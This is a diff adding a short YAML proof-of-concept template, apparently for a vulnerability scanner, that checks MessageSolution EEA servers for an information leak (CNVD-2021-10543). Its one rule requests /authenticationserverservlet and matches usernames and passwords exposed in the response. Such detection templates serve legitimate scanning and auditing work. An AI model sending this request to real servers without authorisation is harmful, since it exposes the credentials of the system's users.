@@ -1,0 +1,16 @@
+name: poc-yaml-eea-info-leak-cnvd-2021-10543
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /authenticationserverservlet
+        expression: response.status == 200 && "<username>(.*?)</username>".bmatches(response.body) && "<password>(.*?)</password>".bmatches(response.body)
+expression: r0()
+detail:
+    author: Search?=Null
+    links:
+        - https://exp1orer.github.io
+    description: MessageSolution Enterprise Email Archiving (EEA) Info Leak.
